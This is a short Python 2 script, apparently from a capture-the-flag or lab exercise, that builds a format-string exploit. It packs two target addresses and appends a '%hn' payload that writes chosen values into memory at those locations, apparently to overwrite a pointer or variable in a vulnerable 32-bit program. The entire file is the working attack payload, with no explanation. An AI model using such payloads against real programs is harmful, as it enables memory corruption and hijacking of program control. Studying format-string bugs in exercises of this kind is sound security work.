import struct

addr1 = struct.pack("I", 0x08049810)
addr2 = struct.pack("I", 0x08049812)

print addr2 + addr1 + "%250d%12$hn%21570d%13$hn"
